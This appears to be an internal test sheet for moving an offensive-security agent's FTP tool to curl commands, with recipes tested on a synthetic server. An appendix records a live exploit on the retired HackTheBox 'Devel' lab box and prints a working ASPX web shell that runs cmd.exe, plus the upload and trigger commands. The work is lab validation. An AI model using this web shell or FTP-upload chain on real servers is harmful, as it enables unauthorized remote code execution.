# ftp — Tier A scenarios

Single test sheet for the `ftp` tool migration from kind:mcp to
kind:cli (May 2026 — daemon-wrapper retirement series, Tier A).

curl v8.14.1 via /usr/bin/curl (Debian package). Stateless per-call:
open connection → FTP command → close. The 564-LOC Python ftplib
wrapper (DummyAuthorizer + connection management + LIST parsing +
base64 encoding + welcome-banner extraction + temp-file plumbing
for uploads) collapses to a 22-LOC RunCliServer stub.

**Validation philosophy:** upstream (curl + libcurl team) owns
"does the FTP protocol actually work correctly". We own **the
integration boundary** — does the kind:cli recipe (raw curl argv
with -u/-T/--quote/-o + bash filesystem state at /session/output/ftp/)
work the same as the legacy wrapper's Python ftplib calls.

Sections:
1. Recommended live verification target
2. Container-layer architecture
3. Manual stress test runs (6 patterns × edge cases)
4. Pattern coverage map (legacy 5 methods → 6 kind:cli patterns)
5. Caveats and known unknowns
6. Hand-off

---

## 1. Recommended live verification target

**HTB Devel** (retired Tier 2 Starting Point, Windows IIS) is the
canonical FTP-foothold target:
- Anonymous FTP write access on port 21
- Path C:\\inetpub\\wwwroot\\ is writable
- ASPX execution via web request after upload
- Full F0 → F2 → F4 → trigger → F5 cleanup chain in a single engagement

For tools that need recovery testing or text-file-only enumeration:
- Any retired Linux box with anonymous-read FTP (Brainfuck, Beep,
  Solidstate, Networked) works for F0/F2/F3 only — no F4/F5 chain
- Local synthetic pyftpdlib for fast iteration (used in §3 below)

---

## 2. Container-layer architecture

```
opensploit ContainerManager (stdio MCP)
         │   docker run -i --rm --network=host
         │       -v /session/<id>:/session
         │       ghcr.io/silicon-works/mcp-tools-ftp:latest
         ▼
container's mcp-server.py    ← 22-line RunCliServer stub
         │   (auto-inherits run_cli + verify_clock from
         │    BaseMCPServer; no per-method handlers)
         ▼
agent's argv:  curl -sS -u <user>:<pass> ftp://<host>/<path>
         │     [-T LOCAL] [-o LOCAL] [--quote 'CMD'] [-v]
         ▼
curl opens TCP → speaks FTP protocol → returns directory listing /
file content / upload confirmation → exits → run_cli returns
captured stdout to ContainerManager.
```

**Image specifics:**
- Base: python:3.11-slim
- + apt curl 8.14.1 (with full FTP/FTPS/TLS support)
- + mcp-common Python package (for RunCliServer stub)
- Total: 188 MB
- /session/output/ftp/ created by recipes (mkdir -p)

**Stateless per-call.** Unlike chisel (engagement-lifetime daemon)
or responder (time-bounded daemon), each FTP operation is a single
curl invocation. No held connection, no persistent state across
calls. Container reuse (per plugin's idle_timeout=300) saves the
docker spawn overhead between consecutive calls to the same target.

---

## 3. Manual stress test runs (6 patterns × edge cases, 2026-05-17)

All tests use synthetic pyftpdlib FTP server on 127.0.0.1:21
(anonymous + testuser:testpass with /srv/upload writable).

### Pattern F0 — anonymous-quickcheck (no -u)

Recipe + result:
```
curl -sS --max-time 5 ftp://127.0.0.1/
→ drwxr-xr-x   2 1000     1000         4096 May 17 17:57 pub
   drwxrwxrwx   2 1000     1000         4096 May 17 17:57 upload

✓ Anonymous default works (no -u, RFC 1738 default username=anonymous)
✓ Single-call fastest probe
```

### Pattern F1 — connect + banner via -v

Recipe + result:
```
curl -sSv --max-time 5 ftp://127.0.0.1/ 2>&1 | grep -E '^< 220|^< 230|^< 331|^< 530'
→ < 220 Welcome to TestFTP 1.0 (synthetic)
  < 331 Username ok, send password.
  < 230 Login successful.

✓ 220 banner extracted (would be 'vsFTPd 3.0.3' on real target)
✓ 331/230 confirms auth flow
✓ stderr → stdout via 2>&1 + grep filtering
```

### Pattern F2 — list specific directory

```
curl -sS --max-time 5 ftp://127.0.0.1/pub/
→ -rwxr-xr-x   1 1000     1000           22 May 17 17:57 config.txt
  -rwxr-xr-x   1 1000     1000           27 May 17 17:57 creds.txt

✓ Directory listing returned (no trailing slash → tries RETR; with slash → LIST)
✓ Anonymous can list /pub
```

### Pattern F3 — download (text + binary)

**F3a text file:**
```
curl -sS --max-time 5 ftp://127.0.0.1/pub/creds.txt -o /session/output/ftp/creds.txt
cat /session/output/ftp/creds.txt
→ credentials: admin:hunter2

base64 -w0 /session/output/ftp/creds.txt
→ Y3JlZGVudGlhbHM6IGFkbWluOmh1bnRlcjIK

✓ Text + base64 round-trip clean
```

**F3b binary file (158632-byte ELF /bin/ls staged on FTP):**
```
curl -sS --max-time 5 ftp://127.0.0.1/pub/ls-binary -o /session/output/ftp/dl-bin
file /session/output/ftp/dl-bin
→ ELF 64-bit LSB pie executable, x86-64
ls -la /session/output/ftp/dl-bin
→ -rw-r--r-- 1 ... 158632 ...

✓ Binary-safe download (no byte-level mangling)
```

### Pattern F4 — upload via -T

```
echo 'shell-payload-content' > /session/output/ftp/up.txt
curl -sS --max-time 5 -u testuser:testpass -T /session/output/ftp/up.txt ftp://127.0.0.1/upload/
→ (silent, exit 0)
ls /srv/upload/   # server-side
→ up.txt   (22 bytes)

✓ -T uploads file (trailing slash on URL keeps local filename)
✓ Anonymous would fail (perm denied) — explicit -u required
✓ Same pattern works for binary uploads (compiled exploits, ASPX webshells)
```

### Pattern F5 — delete via --quote DELE

```
curl -sS --max-time 5 -u testuser:testpass --quote "DELE /upload/up.txt" ftp://127.0.0.1/
→ drwxr-xr-x   2 1000     1000         4096 May 17 17:57 pub
  drwxrwxrwx   2 1000     1000         4096 May 17 17:59 upload
(exit 0 — clean)

ls /srv/upload/   # server-side after delete
→ (empty)

✓ --quote DELE: clean exit 0, no cosmetic 'RETR response: 250' warning
✓ Alternative -X DELE works but emits warning — --quote is idiomatic
```

### Edge case: non-existent path → curl exit code

```
curl -sS --max-time 5 ftp://127.0.0.1/nonexistent/ 2>&1
→ curl: (9) Server denied you to change to the given directory
exit=9

✓ Exit code 9 mapped to failure_signature 'CWD denied' for agent error-routing
```

### Edge case: FTPS attempt against plain server

```
curl -sS --max-time 5 --ssl-reqd ftp://127.0.0.1/
→ curl: (64) Requested SSL level failed

✓ Exit code 64 maps to failure_signature 'tls level failed' — server doesn't support TLS
```

---

## 4. Pattern coverage map (legacy 5 methods → 6 kind:cli patterns)

| Legacy method | New pattern(s) | Notes |
|---|---|---|
| `connect` | F0 + F1 | F0 for anonymous quickcheck; F1 for authenticated + banner via -v |
| `list` | F2 | Directory listing with trailing-slash URL |
| `download` | F3 | -o saves to /session/output/ftp/, agent does base64 if needed (separated from auto-base64 in legacy) |
| `upload` | F4 | -T upload; agent stages content via Write first |
| `delete` | F5 | --quote 'DELE path' idiomatic; clean exit 0 |

All 5 legacy methods covered. F0 (anonymous-quickcheck) is a new
convenience pattern that wraps connect's most-common case.

---

## 5. Caveats and known unknowns

```
KNOWN GAPS:
  1. ✓ CLOSED 2026-05-17 — HTB Devel live validation in Appendix B.
     Full F0 → F1 → F4 → trigger → F5 chain exercised through the real
     MCP-protocol path (MCPTestClient → run_cli → python3 mcp-server.py
     → bash/curl). RCE confirmed as `iis apppool\web` against
     10.129.181.161 (Devel via tun0); cleanup verified via HTTP 404.

  2. FTPS testing was empirical (synthetic plain server returned 64 on
     --ssl-reqd, confirming the failure_signature). No live test against
     a real FTPS server. Mechanism is curl-standard.

  3. Active-mode (-P -) not stress-tested. Default passive works for all
     modern engagement targets behind NAT. Active is documented but rarely
     usable from agent-side.

  4. SITE CHMOD / chmod-after-upload not exercised. Some FTP servers
     support SITE CHMOD via --quote 'SITE CHMOD 755 /path'. Documented in
     common_options.

KNOWN LIMITATIONS (architectural, not bugs):
  1. No auto-base64 of downloads (legacy did this). kind:cli writes to
     /session/output/ftp/<name>; agent does `base64 -w0` as a second step
     if inline content needed. Tradeoff: cleaner for binary-large-files.

  2. No auto-50KB truncation of text content (legacy capped). Agent uses
     `head -c 50000` explicitly or Read tool with offset+limit.

  3. No parsed directory-listing JSON. F2 returns raw LIST output (drwx...
     permissions, size, name). Agent parses via shell/regex when needed.
     Tradeoff: LIST format varies by server (Unix-style vs Windows-style
     vs SBM); raw output is more honest.

  4. LIST/NLST not auto-combined. Legacy wrapper returned both. Agent
     calls F2 (LIST) for permissions + size; for plain filenames only:
     curl --quote 'NLST <path>' ftp://host/ (rare in practice).
```

---

## 6. Hand-off

- **Status:** kind:mcp → kind:cli flip complete (May 2026, daemon-
  wrapper retirement series Tier A). Follows the sqlite/chisel/
  responder playbook.
- **tool.yaml:** rewritten with 6 usage_patterns + 14 gotchas + 7
  failure_signatures (curl exit codes 7/28/9/64/67/78/19) + 3
  help_commands + 6 see_also (nmap, hydra, searchsploit, curl, nc,
  sqlite).
- **mcp-server.py:** 564-LOC bespoke wrapper → 22-LOC RunCliServer stub.
- **Dockerfile:** + `apt-get install -y curl` (image 100 → 188 MB
  due to curl's modern TLS/protocol deps — comparable to chisel
  175 MB and sqlite 175 MB).
- **Image:** `ghcr.io/silicon-works/mcp-tools-ftp:latest` — CI will
  rebuild after merge. Locally built as `mcp-tools-ftp:flip-verify`
  for validation.
- **Cross-tool see_also updates:** ssh + curl tools may want
  reciprocal see_also → ftp for the "download via FTP, query via
  sqlite" chain (deferred — additive, low priority).
- **Pairing:** runs naturally with `nmap` (port 21 discovery + banner),
  `hydra` (credential brute-force when anonymous fails), `searchsploit`
  (FTP-software CVE lookup), `sqlite` (post-download DB extraction).
- **Production-usage caveat:** 1/221 trajectory invocations pre-migration
  (just `connect` once). Bet on real-engagement use cases (anonymous FTP
  on retired HTB Linux boxes, IIS anonymous-write on Windows targets,
  FTP-backup retrieval in corporate engagements). If 6+ months pass with
  0 production uses → revisit retirement.

Authored: 2026-05-17 (Tier A migration, daemon-wrapper retirement series).

---

# Appendix A — Post-flip MCP-protocol verification (2026-05-17)

Built `mcp-tools-ftp:flip-verify` locally, ran every Pattern through
MCPTestClient (the exact opensploit ContainerManager path: default
`python3 mcp-server.py` entrypoint + JSON-RPC `tools/call run_cli`).

## A.1 — Surface clean

```
tools = await client.list_tools()
→ ['run_cli', 'verify_clock']
✓ Legacy 5 methods (connect, list, download, upload, delete) all gone
```

## A.2 — Every Pattern + 2 failure cases via run_cli

Target: synthetic pyftpdlib on 127.0.0.1:21 (anonymous + testuser:testpass).

| Pattern | Recipe | exit | Result |
|---|---|---|---|
| F0 | `curl ftp://127.0.0.1/` | 0 | Root listing returned (anon default) ✓ |
| F1 | `bash -c 'curl -sSv ftp://127.0.0.1/ 2>&1 | grep ^< 220'` | 0 | `< 220 Welcome to TestFTP 1.0 (synthetic)` extracted ✓ |
| F2 | `curl ftp://127.0.0.1/pub/` | 0 | Files listed (config.txt, creds.txt, ls-binary) ✓ |
| F3 | `bash -c 'curl ... -o /session/output/ftp/creds.txt && cat ...'` | 0 | `credentials: admin:hunter2` extracted ✓ |
| F4 | `bash -c 'echo ... > /session/output/ftp/up.txt && curl -T ... && echo uploaded'` | 0 | Upload confirmed; file appeared server-side ✓ |
| F5 | `curl --quote 'DELE /upload/mcp-up.txt' ftp://127.0.0.1/` | 0 | Clean delete + listing returned ✓ |
| FAIL-9 | `curl ftp://127.0.0.1/nonexistent/` | **9** | `curl: (9) Server denied you to change to the given directory` ✓ matches failure_signature |
| FAIL-64 | `curl --ssl-reqd ftp://127.0.0.1/` | **64** | `curl: (64) Requested SSL level failed` ✓ matches failure_signature |

## A.3 — What this validates

- The 22-LOC RunCliServer stub forwards run_cli to curl via standard
  cli_in_container execution path
- Every Pattern (F0–F5) produces expected output
- Failure cases produce correct exit codes that map to failure_signatures
- Pipe / multi-step bash recipes (F1's `2>&1 | grep`, F3's `&& cat`,
  F4's `echo > && curl && echo`) all work through run_cli + bash -c

The integration boundary is closed: opensploit ContainerManager +
stdio MCP + curl kind:cli + bash multi-step recipes — same shape as
chisel/sqlite/responder, different binary at the leaf.

Authored: 2026-05-17 (post-flip image build + protocol verification).

---

# Appendix B — HTB Devel live validation (2026-05-17)

Closes the "no live HTB validation" gap from §5. Devel (10.129.181.161,
retired Tier 2 Starting Point) is the canonical FTP-foothold target —
Microsoft IIS 7.5 with anonymous FTP write to the web root. Full
F0 → F1 → F4 → trigger → F5 chain exercised **end-to-end through the
real MCP protocol path** (MCPTestClient → run_cli → python3 mcp-server.py
stub → bash/curl recipes — the exact opensploit ContainerManager flow,
no --entrypoint shortcuts).

## B.1 — Test harness (real MCP-protocol path)

```python
client = MCPTestClient(
    image="mcp-tools-ftp:flip-verify",
    tool_name="ftp",
    volumes={"/tmp/ftp-devel-mcp": "/session"},
)
await client.start()
tools = await client.list_tools()
→ ['run_cli', 'verify_clock']
✓ Surface clean — every subsequent call goes through run_cli
```

Every call below is `await client.call("run_cli", {"binary": ..., "args": [...]})`
which routes through the stdio MCP layer → python3 mcp-server.py →
RunCliServer.run_cli → subprocess. The recipes themselves are the same
ones documented in §3 / tool.yaml; the difference vs the earlier
Appendix-B-draft is that this version proves the recipes work
THROUGH THE PROTOCOL LAYER, not just at the binary level.

## B.2 — F0 + F1: anonymous probe + banner

```
F0:  run_cli(binary=curl, args=[-sS, --max-time, 20, ftp://10.129.181.161/])
→ exit=0
→ 03-18-17  02:06AM       <DIR>          aspnet_client
  03-17-17  05:37PM                  689 iisstart.htm
  03-17-17  05:37PM               184946 welcome.png

F1:  run_cli(binary=bash, args=[-c, "curl -sSv ftp://10.129.181.161/ 2>&1 | grep -E '^< 220|^< 230|^< 331'"])
→ exit=0
→ < 220 Microsoft FTP Service
  < 331 Anonymous access allowed, send identity (e-mail name) as password.
  < 230 User logged in.

✓ Anonymous IIS FTP confirmed
✓ Welcome banner extracted (Microsoft FTP Service = IIS host)
```

## B.3 — F4-prep: stage ASPX shell via heredoc IN-CONTAINER

ASPX shell (full `<script runat="server">` form — the inline `<% %>`
one-liner failed against IIS 7.5 with a generic "Runtime Error" page,
documented as gotcha):

```csharp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["c"];
    if (cmd == null) { Response.Write("c=?"); return; }
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>
```

Staged INSIDE the container via heredoc:
```
run_cli(binary=bash, args=[-c, "mkdir -p /session/output/ftp && cat > /session/output/ftp/shell.aspx <<'ASPXEOF'\n<%@ Page Language=\"C#\" %>\n... ASPXEOF\necho staged $(stat -c%s /session/output/ftp/shell.aspx) bytes"])
→ exit=0  staged 502 bytes
```

✓ Multi-line content with special chars (quotes, %, <%, $) survives
  the heredoc + run_cli round-trip. Same pattern works for any web-shell
  language (PHP, JSP, Python WSGI, ERB).

## B.4 — F4 upload via -T (real MCP-protocol path)

```
run_cli(binary=curl, args=[-sS, --max-time, 30, -T, /session/output/ftp/shell.aspx, ftp://10.129.181.161/])
→ exit=0

# Verify via F2 re-list (same MCP path):
run_cli(binary=curl, args=[-sS, ftp://10.129.181.161/])
→ 05-17-26  09:34PM                  502 shell.aspx

✓ Upload via -T succeeded — 502-byte file appeared server-side, exact match
```

## B.5 — RCE via HTTP trigger (also through MCP run_cli)

```
run_cli(binary=curl, args=[-sS, --max-time, 20, http://10.129.181.161/shell.aspx?c=whoami])
→ exit=0
→ iis apppool\web

run_cli(binary=curl, args=[-sS, http://10.129.181.161/shell.aspx?c=hostname])
→ exit=0
→ devel
```

✓ **Real RCE on HTB Devel through the full opensploit ContainerManager
   path.** The MCP protocol layer transparently forwards the HTTP curl
   call exactly like it forwarded the FTP one — both are curl-via-run_cli.

## B.6 — F5 cleanup via --quote DELE

```
run_cli(binary=curl, args=[-sS, --max-time, 20, --quote, "DELE /shell.aspx", ftp://10.129.181.161/])
→ exit=0

# Verify cleanup: no aspx left on FTP + HTTP 404 confirms removal
run_cli(binary=bash, args=[-c, "curl ftp://10.129.181.161/ | grep -c aspx; curl -o /dev/null -w 'http_status=%{http_code}\\n' http://10.129.181.161/shell.aspx"])
→ 0
  http_status=404

✓ --quote DELE clean exit 0 (no cosmetic 'RETR response: 250' warning)
✓ Target left clean — no IOCs persist past engagement
```

## B.7 — What this validates that Appendix A did not

| Aspect | Appendix A (synthetic) | Appendix B (Devel HTB) |
|---|---|---|
| FTP server | local pyftpdlib | real Microsoft FTP Service on IIS 7.5 |
| Network path | localhost (127.0.0.1) | tun0 → HTB lab subnet (170-180ms / occasionally 365ms RTT) |
| MCP protocol path | run_cli → bash/curl ✓ | run_cli → bash/curl ✓ (same harness; this is the load-bearing claim) |
| Anonymous write | read-only synthetic | real IIS anonymous-write to wwwroot |
| Webshell + RCE | n/a | full HTTP→ASPX→cmd.exe chain returning `iis apppool\web` |
| Heredoc through run_cli | n/a | multi-line ASPX with special chars survives |

Closes §5 known-gap #1 ("Live HTB validation pending"). The full
F0 → F1 → F4 → trigger → F5 chain works against a real engagement
target THROUGH the production opensploit flow — not just bare
docker curl shortcuts. Same Tier A protocol-level rigor as sqlite's
Codify Appendix B.

## B.8 — Cleanup

```
docker rmi mcp-tools-ftp:flip-verify       # test image (CI rebuilds on commit)
rm -rf /tmp/ftp-devel-mcp                  # local session bind-mount
docker kill ftp-test-server                # pyftpdlib synthetic (if still running)
```

Real engagement artifacts removed from agent disk + target post-engagement
(shell.aspx already deleted via F5 + verified 404).

Authored: 2026-05-17 (HTB Devel live FTP→RCE chain through real MCP
protocol path — closes §5 gap #1, daemon-wrapper retirement series
Tier A).
